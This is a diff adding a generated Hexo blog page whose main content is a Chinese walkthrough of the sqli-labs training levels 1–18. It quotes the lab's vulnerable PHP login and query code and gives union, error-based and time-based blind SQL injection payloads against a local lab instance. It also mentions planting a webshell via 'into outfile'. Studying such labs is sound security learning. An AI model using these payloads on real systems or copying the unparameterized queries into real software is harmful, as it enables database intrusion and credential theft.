@@ -1,32 +1,280 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fish | Fish</title><meta name="author" content="Fish"><meta name="copyright" content="Fish"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="需要掌握的MySQL基本知识imformation_schema数据库中有很多张表，其中有用的信息如下： tables_schema：存放每个数据库中的所有表名，常用查询语句 select table_name from imformation_schema.tables where table_schema &#x3D; &#39;xxxx&#39; columns：存放表名，以及每张表的列名，常用查询语">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fish">
+<meta property="og:url" content="http://example.com/2/index.html">
+<meta property="og:site_name" content="Fish">
+<meta property="og:description" content="需要掌握的MySQL基本知识imformation_schema数据库中有很多张表，其中有用的信息如下： tables_schema：存放每个数据库中的所有表名，常用查询语句 select table_name from imformation_schema.tables where table_schema &#x3D; &#39;xxxx&#39; columns：存放表名，以及每张表的列名，常用查询语">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-09-27T10:45:09.365Z">
+<meta property="article:modified_time" content="2021-12-31T16:18:03.175Z">
+<meta property="article:author" content="Fish">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/bulefish32.png"><link rel="canonical" href="http://example.com/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:18:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/footer.css"><link rel="stylesheet" href="/css/roll.css"><link rel="stylesheet" href="/css/fold2.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Fish" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E7%8D%AD%E7%8D%AD.JPG" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fish</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2021-09-27T10:45:09.365Z" title="undefined 2021-09-27 18:45:09">2021-09-27</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="需要掌握的MySQL基本知识"><a href="#需要掌握的MySQL基本知识" class="headerlink" title="需要掌握的MySQL基本知识"></a>需要掌握的MySQL基本知识</h1><p>imformation_schema数据库中有很多张表，其中有用的信息如下：</p>
+<p>tables_schema：存放每个数据库中的所有表名，常用查询语句 <code>select table_name from imformation_schema.tables where table_schema = &#39;xxxx&#39;</code></p>
+<p>columns：存放表名，以及每张表的列名，常用查询语句<code>select column_name from imformation_schema.columns where table_name = &#39;xxxx&#39;</code></p>
+<p>常用函数：</p>
+<ul>
+<li>version()，查询系统版本</li>
+<li>database()，查询当前数据库名</li>
+<li>concat()，使用符号连接字符串</li>
+<li>group_concat()，将多个返回信息变成一列</li>
+</ul>
+<h1 id="Less-1-2"><a href="#Less-1-2" class="headerlink" title="Less-1/2"></a>Less-1/2</h1><p>Less-1: 字符形注入，需要加单引号。</p>
+<p>Less-2: 数字型注入，不需要加单引号就可以注入。</p>
+<h1 id="Less-3-4"><a href="#Less-3-4" class="headerlink" title="Less-3/4"></a>Less-3/4</h1><p>Less-3: 从源代码看出查询语句加入了括号，目标就是绕过括号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+<p>原理和单引号差不多，但是多了括号就需要有括号的闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-3/?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<p>Less-4: 和第三关一样，区别就是从单引号变成了双引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-4/?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<h1 id="Less-5-6"><a href="#Less-5-6" class="headerlink" title="Less-5/6"></a>Less-5/6</h1><p>Less-5: 报错注入，这里使用updatexml函数，常用的两个函数如下</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210914110623524.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-5/?id=-1&#x27; and updatexml(1, concat(0x7e, (select database())), 1)--+</span><br></pre></td></tr></table></figure>
+
+<p>Less-6: 单引号变双引号，那就闭合双引号，作者源代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http://0.0.0.0:8080/Less-6/?id=1&quot; and updatexml(1, concat(0x7e, (select database())), 1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="Less-7-8"><a href="#Less-7-8" class="headerlink" title="Less-7/8"></a>Less-7/8</h1><p>使用into_outfile函数写一句话木马，拿到网站webshell，buu上目前无法获取网站路径，先跳过，后面搭建本地环境搞。</p>
+<h1 id="Less-9-10"><a href="#Less-9-10" class="headerlink" title="Less-9/10"></a>Less-9/10</h1><p>sql盲注，没有了所有报错回显，脚本在写了在写了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">        if($row)</span><br><span class="line">        &#123;</span><br><span class="line">        echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;You are in...........&#x27;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">        echo &#x27;You are in...........&#x27;;</span><br><span class="line">        //print_r(mysql_error());</span><br><span class="line">        //echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">        echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">        echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Less-11-12"><a href="#Less-11-12" class="headerlink" title="Less-11/12"></a>Less-11/12</h1><p>Less-11：使用登录框登录，不同与之前，这次的提交方式是Post，但是注入方式和之前一样</p>
+<p>源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">        $uname=$_POST[&#x27;uname&#x27;];</span><br><span class="line">        $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">        //logging the connection parameters to a file for analysis.</span><br><span class="line">        $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">        fwrite($fp,&#x27;User Name:&#x27;.$uname);</span><br><span class="line">        fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\n&quot;);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // connectivity </span><br><span class="line">        @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">        echo $sql.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $result=mysql_query($sql);</span><br><span class="line">        $row = mysql_fetch_array($result);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=admin&amp;passwd=admin&#x27; and 1=2 union select database(),version()#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Less-12：同样是使用post提交方式，但是在提交之前对两个变量添加了双引号，并且在查询的时候使用的括号，源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以在注入的时候需要添加双引号和括号进行闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=admin&amp;passwd=admin&quot;) and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Less-13-14"><a href="#Less-13-14" class="headerlink" title="Less-13/14"></a>Less-13/14</h1><p>Less-13：双注入，没有任何回显，使用报错注入，源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">   @$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">   $result=mysql_query($sql);</span><br><span class="line">   $row = mysql_fetch_array($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&#x27;) and extractvalue(1,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Less-14：查询参数两边添加了双引号，所以添加双引号进行闭合，但还是使用报错注入，源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">   // connectivity</span><br><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">   $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;</span><br><span class="line">   @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</span><br><span class="line">   $result=mysql_query($sql);</span><br><span class="line">   $row = mysql_fetch_array($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e))#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Less-15-16"><a href="#Less-15-16" class="headerlink" title="Less-15/16"></a>Less-15/16</h1><p>Less-15：post提交方式的sql盲注，没有任何回显，报错注入也不行，可以试一试布尔时间盲注</p>
+<p>下面两种写法都不是很通用，他需要存在uname的前提下才可以注入，所以写一个通用的（在没有waf的前提下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误的payload: uname=admin&amp;passwd=1&#x27; and if(length(database())=8, sleep(5), 1) #</span><br><span class="line">错误的payload: uname=admin&#x27; and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确的payload: uname=1&#x27; and 1=2 union select 1,sleep(5) #&amp;passwd=1</span><br><span class="line">            : uname=Dhakkan and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure>
+
+<p>这种写法就要好一点，只需要查询返回的列相同就行</p>
+<p>Less-16：好像是Hackbar出问题了，POST提交方式提交不上去(搞清楚了，不是hackbar的问题，如果使用hackbar的POST提交方式要将所有的参数写全)</p>
+<p>源代码如下，因为注释了登录信息，还使用@符号抑制了sql语句报错，所以不会有任何回显，使用盲注爆破。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	<span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity</span></span><br><span class="line">	<span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">  		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">		<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=1&quot;) and 1=2 union select 1,sleep(5) #&amp;passwd=1</span><br><span class="line">	   : uname=Dhakkan&quot;) and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure>
+
+<p>把上面的sleep函数换成if判断语句就可以进行爆破了，但是盲注脚本还是没有写，懒狗一条，先学学sqlmap的使用方式（学玩就写）</p>
+<h1 id="Less-17-18"><a href="#Less-17-18" class="headerlink" title="Less-17/18"></a>Less-17/18</h1><p>Less-17：基于更新语句的报错注入，审源码逻辑。有一个check_input函数，作用是去掉转意的反斜杠，确保uname没有sql注入，但是还要研究研究这个函数，感觉这关主要就是学习这个check_input函数。在检查uname之后，进行查询</p>
+<p>关于Mysql中的update语句，如果后面不加限制条件，那么改变的是整个表的值，后面可以接and跟我们需要的报错语句，如果源代码中没有没收报错回显，那么就可以成功使用报错注入。但是这道题有个条件，那就是用户名必须存在。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)), 1) #</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Less-18：头部报错注入，使用代理提交，估计是想让我们使用burpsuite抓包修改头部代理</p>
+<p>需要了解的知识：User Agent</p>
